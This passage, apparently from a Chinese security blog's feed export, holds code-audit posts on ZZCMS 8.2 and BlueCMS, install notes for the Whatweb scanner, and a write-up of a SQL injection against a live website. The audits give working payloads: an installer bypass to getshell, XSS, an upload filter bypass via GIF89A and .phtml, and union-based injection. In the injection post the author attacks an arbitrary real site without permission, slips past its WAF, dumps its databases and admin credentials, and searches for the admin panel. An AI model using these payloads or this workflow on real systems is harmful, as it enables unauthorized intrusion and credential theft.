&amp;&amp; $oldimg&lt;&gt;&quot;/image/nopic.gif&quot;)&#123;</span><br><span class="line">$f=&quot;../&quot;.$oldimg;</span><br><span class="line">if (file_exists($f))&#123;</span><br><span class="line">unlink($f);</span><br><span class="line">&#125;</span><br><span class="line">$fs=&quot;../&quot;.str_replace(&quot;.&quot;,&quot;_small.&quot;,$oldimg).&quot;&quot;;</span><br><span class="line">if (file_exists($fs))&#123;</span><br><span class="line">unlink($fs);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h2 id="网站重装getshell漏洞"><a href="#网站重装getshell漏洞" class="headerlink" title="网站重装getshell漏洞"></a>网站重装getshell漏洞</h2><h3 id="漏洞发生在-install-index-php"><a href="#漏洞发生在-install-index-php" class="headerlink" title="漏洞发生在/install/index.php"></a>漏洞发生在/install/index.php</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">...</span><br><span class="line"><span class="keyword">include</span> <span class="string">'../inc/config.php'</span>;</span><br><span class="line"><span class="keyword">include</span> <span class="string">'conn.php'</span>;</span><br><span class="line"><span class="keyword">if</span>($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line"><span class="keyword">if</span>($_GET) extract($_GET, EXTR_SKIP);</span><br><span class="line">$submit = <span class="keyword">isset</span>($_POST[<span class="string">'submit'</span>]) ? <span class="keyword">true</span> : <span class="keyword">false</span>;</span><br><span class="line">$step = <span class="keyword">isset</span>($_POST[<span class="string">'step'</span>]) ? $_POST[<span class="string">'step'</span>] : <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">switch</span>($step) &#123;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'1'</span>:</span><br><span class="line"><span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'2'</span>:</span><br><span class="line">...</span><br><span class="line"><span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'3'</span>:</span><br><span class="line"><span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'4'</span>:</span><br><span class="line"><span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'5'</span>:</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dexit</span><span class="params">($msg)</span> </span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;script&gt;alert("'</span>.$msg.<span class="string">'");window.history.back();&lt;/script&gt;'</span>;</span><br><span class="line"><span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$conn=connect($db_host,$db_user,$db_pass,<span class="string">''</span>,$db_port);</span><br><span class="line"><span class="keyword">if</span>(!$conn) dexit(<span class="string">'无法连接到数据库服务器，请检查配置'</span>);</span><br><span class="line">$db_name <span class="keyword">or</span> dexit(<span class="string">'请填写数据库名'</span>);</span><br><span class="line"><span class="keyword">if</span>(!select_db($db_name)) &#123;</span><br><span class="line"><span class="keyword">if</span>(!query(<span class="string">"CREATE DATABASE $db_name"</span>)) dexit(<span class="string">'指定的数据库不存在\n\n系统尝试创建失败，请通过其他方式建立数据库'</span>);</span><br><span class="line">&#125;</span><br><span class="line">...</span><br><span class="line">$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">$str = fread($f,filesize($fp));</span><br><span class="line">fclose($f);</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlhost','"</span>.sqlhost.<span class="string">"')"</span>,<span class="string">"define('sqlhost','$db_host')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlport','"</span>.sqlport.<span class="string">"')"</span>,<span class="string">"define('sqlport','$db_port')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqldb','"</span>.sqldb.<span class="string">"')"</span>,<span class="string">"define('sqldb','$db_name')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqluser','"</span>.sqluser.<span class="string">"')"</span>,<span class="string">"define('sqluser','$db_user')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('sqlpwd','"</span>.sqlpwd.<span class="string">"')"</span>,<span class="string">"define('sqlpwd','$db_pass')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br><span class="line">$str=str_replace(<span class="string">"define('logourl','"</span>.logourl.<span class="string">"')"</span>,<span class="string">"define('logourl','$url/image/logo.png')"</span>,$str) ;</span><br><span class="line">$f=fopen($fp,<span class="string">"w+"</span>);</span><br><span class="line">fputs($f,$str);</span><br><span class="line">fclose($f);</span><br><span class="line"><span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line"><span class="keyword">case</span> <span class="string">'6'</span>:</span><br><span class="line"><span class="keyword">include</span> <span class="string">'step_'</span>.$step.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="分析代码"><a href="#分析代码" class="headerlink" title="分析代码"></a>分析代码</h3><p>代码中通过传入的step的值是多少对应该目录下的文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">switch($step) &#123;</span><br><span class="line">case &apos;1&apos;:</span><br><span class="line">include &apos;step_&apos;.$step.&apos;.php&apos;;</span><br><span class="line">break;</span><br></pre></td></tr></table></figure></p><p>仔细阅读该每一个step文件可知，只有当step=1的时候才会检测/install/install.lock文件是否存在。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if(file_exists(&quot;install.lock&quot;))&#123;</span><br><span class="line">echo &quot;&lt;div style=&apos;padding:30px;&apos;&gt;安装向导已运行安装过，如需重安装，请删除 /install/install.lock 文件&lt;/div&gt;&quot;;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>也就是说，抓包改一下step=2可以绕过检测跳到安装界面</p><p><img src="https://s2.ax1x.com/2019/09/24/ukzVN4.png" alt="image"></p><p>接下来的如何getshell呢，下面有段代码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$fp=<span class="string">"../inc/config.php"</span>;</span><br><span class="line">$f = fopen($fp,<span class="string">'r'</span>);</span><br><span class="line">$str = fread($f,filesize($fp));</span><br><span class="line">      fclose($f);</span><br><span class="line">      $str=str_replace(<span class="string">"define('siteurl','"</span>.siteurl.<span class="string">"')"</span>,<span class="string">"define('siteurl','$url')"</span>,$str) ;</span><br></pre></td></tr></table></figure><p>$url是可写入的，因为上面有一段代码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if($_POST) extract($_POST, EXTR_SKIP);</span><br><span class="line">if($_GET) extract($_GET, EXTR_SKIP);</span><br></pre></td></tr></table></figure></p><p>可见这段extract函数把get,post传进来的值注册为变量</p><p><img src="https://s2.ax1x.com/2019/09/24/uAukSP.png" alt="image"></p><p><img src="https://s2.ax1x.com/2019/09/24/uAuwf1.png" alt="image"></p><h2 id="反射型xss"><a href="#反射型xss" class="headerlink" title="反射型xss"></a>反射型xss</h2><h3 id="漏洞发生在-inc-top-php开始处"><a href="#漏洞发生在-inc-top-php开始处" class="headerlink" title="漏洞发生在/inc/top.php开始处"></a>漏洞发生在/inc/top.php开始处</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (@$_POST[&quot;action&quot;]==&quot;search&quot;)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;location.href=&apos;&quot;.@$_POST[&quot;lb&quot;].&quot;/search.php?keyword=&quot;.@$_POST[&quot;keyword&quot;].&quot;&apos;&lt;/script&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if (isset($_REQUEST[&quot;skin&quot;]))&#123;</span><br><span class="line">$siteskin=$_REQUEST[&quot;skin&quot;];</span><br><span class="line">&#125;else&#123;</span><br><span class="line">$siteskin=siteskin;</span><br><span class="line">....</span><br></pre></td></tr></table></figure><p>抓包构造xss<br><img src="https://s2.ax1x.com/2019/09/25/uEr3bF.png" alt="image"></p><h2 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h2><p>在/uploadimg.php处</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function upfile() &#123;</span><br><span class="line">if (!is_uploaded_file(@$this-&gt;fileName[tmp_name]))&#123;</span><br><span class="line">   echo &quot;&lt;script&gt;alert(&apos;请点击“浏览”，先选择您要上传的文件！\\n\\n支持的图片类型为：jpg,gif,png,bmp&apos;);parent.window.close();&lt;/script&gt;&quot;; exit;</span><br><span class="line">&#125;</span><br><span class="line">if ($this-&gt;max_file_size*1024 &lt; $this-&gt;fileName[&quot;size&quot;])&#123;</span><br><span class="line">   echo &quot;&lt;script&gt;alert(&apos;文件大小超过了限制！最大只能上传 &quot;.$this-&gt;max_file_size.&quot; K的文件&apos;);parent.window.close();&lt;/script&gt;&quot;;exit;</span><br><span class="line">&#125;</span><br><span class="line">if (!in_array($this-&gt;fileName[&quot;type&quot;], $this-&gt;uptypes)) &#123;</span><br><span class="line">   echo &quot;&lt;script&gt;alert(&apos;文件类型错误，支持的图片类型为：jpg,gif,png,bmp&apos;);parent.window.close();&lt;/script&gt;&quot;;exit;</span><br><span class="line">&#125;</span><br><span class="line">$hzm=strtolower(substr($this-&gt;fileName[&quot;name&quot;],strpos($this-&gt;fileName[&quot;name&quot;],&quot;.&quot;)));</span><br><span class="line">if (strpos($hzm,&quot;php&quot;)!==false || strpos($hzm,&quot;asp&quot;)!==false ||strpos($hzm,&quot;jsp&quot;)!==false)&#123;</span><br><span class="line">echo &quot;&lt;script&gt;alert(&apos;&quot;.$hzm.&quot;，这种文件不允许上传&apos;);parent.window.close();&lt;/script&gt;&quot;;exit;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是要求文件是post传上来的，然后检查文件大小，再是检查文件类型，这里在文件头加GIF89A，可骗过，最后是检查文件后缀，可以用phtml绕过，apache会将phtml文件按照php文件来解析</p><p><img src="https://s2.ax1x.com/2019/10/09/u4wm5V.png" alt="image"></p><p><img src="https://s2.ax1x.com/2019/10/09/u4wHI0.png" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ZZCMS8-2-代码审计&quot;&gt;&lt;a href=&quot;#ZZCMS8-2-代码审计&quot; class=&quot;headerlink&quot; title=&quot;ZZCMS8.2 代码审计&quot;&gt;&lt;/a&gt;ZZCMS8.2 代码审计&lt;/h1&gt;&lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; cla
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>网站指纹识别工具Whatweb</title>
    <link href="http://yoursite.com/2019/08/08/whatweb/"/>
    <id>http://yoursite.com/2019/08/08/whatweb/</id>
    <published>2019-08-08T06:47:30.145Z</published>
    <updated>2019-08-08T07:11:32.496Z</updated>
    
    <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>主要是mac下载whatweb的时候出现了不少的麻烦，总感觉自己的mac不干净，这里记录一下遇到的意外以及安装步骤，便于日后防备</p><h3 id="whatweb介绍"><a href="#whatweb介绍" class="headerlink" title="whatweb介绍"></a>whatweb介绍</h3><p>Whatweb是一个基于Ruby语言的开源网站指纹识别软件<br>whatweb能够识别各种关于网站的详细信息包括：CMS类型、博客平台、中间件、web框架模块、网站服务器、脚本类型、JavaScript库、IP、cookie等。</p><h3 id="安装步骤"><a href="#安装步骤" class="headerlink" title="安装步骤"></a>安装步骤</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ git clone https://github.com/urbanadventurer/whatweb</span><br><span class="line"></span><br><span class="line">$ cd whatweb</span><br><span class="line"></span><br><span class="line">$ ./whatweb</span><br></pre></td></tr></table></figure><h3 id="几个注意点"><a href="#几个注意点" class="headerlink" title="几个注意点"></a>几个注意点</h3><h4 id="0x01-Git"><a href="#0x01-Git" class="headerlink" title="0x01 Git"></a>0x01 Git</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone 的时候要注意终端代理是否设置</span><br><span class="line">env | grep proxy</span><br><span class="line">unset http_proxy</span><br><span class="line">unset https_proxy</span><br></pre></td></tr></table></figure><h4 id="0x02-Gem"><a href="#0x02-Gem" class="headerlink" title="0x02 Gem"></a>0x02 Gem</h4><p>Gem是一个管理Ruby库和程序的标准包，它通过Ruby Gem（如 <a href="http://rubygems.org/" target="_blank" rel="noopener">http://rubygems.org/</a> ）源来查找、安装、升级和卸载软件包，非常的便捷</p><p>./whatweb 的时候会报错如图:<br><img src="https://s2.ax1x.com/2019/08/08/eTN3jg.jpg" alt="image"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gem intall addressable</span><br><span class="line">gem install ipaddr</span><br></pre></td></tr></table></figure><h3 id="使用命令"><a href="#使用命令" class="headerlink" title="使用命令"></a>使用命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">EXAMPLE USAGE:</span><br><span class="line">* Scan example.com.</span><br><span class="line">  ./whatweb example.com</span><br><span class="line">* Scan reddit.com slashdot.org with verbose plugin descriptions.</span><br><span class="line">  ./whatweb -v reddit.com slashdot.org</span><br><span class="line">* An aggressive scan of wired.com detects the exact version of WordPress.</span><br><span class="line">  ./whatweb -a 3 www.wired.com</span><br><span class="line">* Scan the local network quickly and suppress errors.</span><br><span class="line">  whatweb --no-errors 192.168.0.0/24</span><br><span class="line">* Scan the local network for HTTPS websites.</span><br><span class="line">  whatweb --no-errors --url-prefix https:// 192.168.0.0/24</span><br><span class="line">* Scan for crossdomain policies in the Alexa Top 1000.</span><br><span class="line">  ./whatweb -i plugin-development/alexa-top-100.txt \</span><br><span class="line">  --url-suffix /crossdomain.xml -p crossdomain_xml</span><br><span class="line"></span><br><span class="line">  Note: This is the short usage help.</span><br><span class="line">  For the complete usage help use -h or --help.</span><br></pre></td></tr></table></figure><p>例子：<br><img src="https://s2.ax1x.com/2019/08/08/eTaYYq.jpg" alt="image"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;主要是mac下载whatweb的时候出现了不少的麻烦，总感觉自己的mac不干净，这里记录一下遇到的意外以及安装步骤，便于日后防备&lt;/p&gt;
&lt;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>记一次过waf注入</title>
    <link href="http://yoursite.com/2019/07/31/sql-hack1/"/>
    <id>http://yoursite.com/2019/07/31/sql-hack1/</id>
    <published>2019-07-31T05:00:47.429Z</published>
    <updated>2019-08-01T04:12:17.132Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>闲来无事，就去搜搜了一下网站，遇到带有waf的一个站，便尝试绕了一下(全程打码)</p><h2 id="绕waf注入"><a href="#绕waf注入" class="headerlink" title="绕waf注入"></a>绕waf注入</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xxxx.com/xxx.php?id=10 and 1=1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/08/01/eUkXlt.jpg" alt="image"></p><p>被waf拦截了，尝试fuzz了一下，发现这个waf只针对拼接起来的sql语句，对单个字符不过滤，比如and,or,=都没过滤，尝试用加号代替空格</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/php?id=10+and+1=1</span><br></pre></td></tr></table></figure><p><img src="https://s2.ax1x.com/2019/08/01/eUA49s.jpg" alt="image"></p><p>可见不再被拦截，成功绕过</p><p>当 id=10+and+1=2时，如下：</p><p><img src="https://s2.ax1x.com/2019/08/01/eUAON4.jpg" alt="image"></p><p>可见存在sql注入</p><p>然后尝试二分法order by 判断列数，也可以用联合查询判断,这里要注意加号问题，否则会被拦截<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.xxx.com/xxx.php?id=0 union select+1,2,3,4,5,6,7,8,9,10,11</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/08/01/eUeqMR.jpg" alt="image"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">可见直到11才有回显，也就是说它一共有11列</span><br><span class="line"></span><br><span class="line">最后就是爆库爆表了</span><br><span class="line">http://www.xxxx.com/xxxx.php?id=0+union select+1,2,3,unhex(hex(cast(schema_name as char))),5,6,7,8,9,10,11 from information_schema.schemata limit 1,1</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/08/01/eUEVCd.jpg" alt="image"></p><p>可见成功爆出库名，接下来的就简单多了，这里不用concat是因为该字符被拦截了，由于表名太多，尝试写个脚本爆破</p><p><img src="https://s2.ax1x.com/2019/08/01/eUE0VU.jpg" alt="image"></p><p>这里脚本用了time.sleep,毕竟太快容易导致崩，此次只是学习测试而已</p><p>可见有admin，尝试爆了一下该表内容，发现存在管理员账号密码</p><p><img src="https://s2.ax1x.com/2019/08/01/eUmtFU.jpg" alt="image"></p><p>想想能不能找到后台输入密码，google搜了一下后台未果，尝试用dirsearch扫了一下发现有个login，但页面却没有输入点，突然找到一个后台上传</p><p><img src="https://s2.ax1x.com/2019/08/01/eUwpY4.jpg" alt="image"></p><p><img src="https://s2.ax1x.com/2019/08/01/eUwufH.jpg" alt="image"></p><p>根据搜集到的信息可知是个iis7.5+php，上网搜了一下iis7.5解析漏洞，尝试了一下未果，应该是cgi.fix_pathinfo未开放，渗透到此结束～</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;闲来无事，就去搜搜了一下网站，遇到带有waf的一个站，便尝试绕了一下(全程打码)&lt;/p&gt;
&lt;h2 id=&quot;绕waf注入&quot;&gt;&lt;a href=&quot;
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>代码审计[day1]-bluecms</title>
    <link href="http://yoursite.com/2019/06/09/bluecms/"/>
    <id>http://yoursite.com/2019/06/09/bluecms/</id>
    <published>2019-06-09T03:47:40.622Z</published>
    <updated>2019-06-10T09:14:26.358Z</updated>
    
    <content type="html"><![CDATA[<p>bluecms是一种小众cms，适合用来入门代码审计，代码本身一堆漏洞，方便小白快速理解入门</p><h3 id="0x01-环境搭建"><a href="#0x01-环境搭建" class="headerlink" title="0x01 环境搭建"></a>0x01 环境搭建</h3><p>BlueCMS v1.6 sp1</p><p>Phpstudy php5.2+apache+mysql</p><p>Windows10</p><h3 id="0x02-代码审计"><a href="#0x02-代码审计" class="headerlink" title="0x02 代码审计"></a>0x02 代码审计</h3><h4 id="SQL1"><a href="#SQL1" class="headerlink" title="SQL1"></a>SQL1</h4><p>./ad_js.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">require_once dirname(__FILE__).&apos;/include/common.inc.php&apos;;</span><br><span class="line"></span><br><span class="line">$ad_id = !empty($_GET[&apos;ad_id&apos;]) ? trim($_GET[&apos;ad_id&apos;]) : &apos;&apos;;</span><br><span class="line">...</span><br><span class="line">$ad = $db-&gt;getone(&quot;SELECT * FROM &quot;.table(&apos;ad&apos;).&quot; WHERE ad_id =&quot;.$ad_id);</span><br><span class="line">...</span><br><span class="line">$ad_content = $ad[&apos;content&apos;];</span><br><span class="line">...</span><br><span class="line">echo &quot;&lt;!--\r\ndocument.write(\&quot;&quot;.$ad_content.&quot;\&quot;);\r\n--&gt;\r\n&quot;;</span><br></pre></td></tr></table></figure></p><p>每个文件基本都包含了common.inc.php，而在这个文件中，有一处这样的过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">if(!get_magic_quotes_gpc())</span><br><span class="line">&#123;</span><br><span class="line">$_POST = deep_addslashes($_POST);</span><br><span class="line">$_GET = deep_addslashes($_GET);</span><br><span class="line">$_COOKIES = deep_addslashes($_COOKIES);</span><br><span class="line">$_REQUEST = deep_addslashes($_REQUEST);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>而deep_addslashes定义是</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function deep_addslashes($str)</span><br><span class="line">&#123;</span><br><span class="line">if(is_array($str))</span><br><span class="line">&#123;</span><br><span class="line">foreach($str as $key=&gt;$val)</span><br><span class="line">&#123;</span><br><span class="line">$str[$key] = deep_addslashes($val);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$str = addslashes($str);</span><br><span class="line">&#125;</span><br><span class="line">return $str;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>不过这里的过滤只针对字符型注入，而这里的sql语句是整型注入，不受过滤影响</p><p>payload:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ad_js.php?ad_id=0 union select 1,2,3,4,5,6,group_concat(table_name) from information_schema.tables where table_schema=database()</span><br></pre></td></tr></table></figure></p><p><img src="https://s2.ax1x.com/2019/06/09/VsSRDU.jpg" alt="image"></p><h4 id="IP注入"><a href="#IP注入" class="headerlink" title="IP注入"></a>IP注入</h4><p>./include/common.fun.php<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">function getip()</span><br><span class="line">&#123;</span><br><span class="line">if (getenv(&apos;HTTP_CLIENT_IP&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_CLIENT_IP&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_X_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_X_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED_FOR&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED_FOR&apos;);</span><br><span class="line">&#125;</span><br><span class="line">elseif (getenv(&apos;HTTP_FORWARDED&apos;))</span><br><span class="line">&#123;</span><br><span class="line">$ip = getenv(&apos;HTTP_FORWARDED&apos;);</span><br><span class="line">&#125;</span><br><span class="line">else</span><br><span class="line">&#123;</span><br><span class="line">$ip = $_SERVER[&apos;REMOTE_ADDR&apos;];</span><br><span class="line">&#125;</span><br><span class="line">return $ip;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>全局搜索一下在guest_book.php发现可利用点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$online_ip = getip();</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">elseif ($act == &apos;send&apos;)</span><br><span class="line">&#123;</span><br><span class="line">$user_id = $_SESSION[&apos;user_id&apos;] ? $_SESSION[&apos;user_id&apos;] : 0;</span><br><span class="line">$rid = intval($_POST[&apos;rid&apos;]);</span><br><span class="line"> $content = !empty($_POST[&apos;content&apos;]) ? htmlspecialchars($_POST[&apos;content&apos;]) : &apos;&apos;;</span><br><span class="line"> $content = nl2br($content);</span><br><span class="line"> if(empty($content))</span><br><span class="line"> &#123;</span><br><span class="line"> 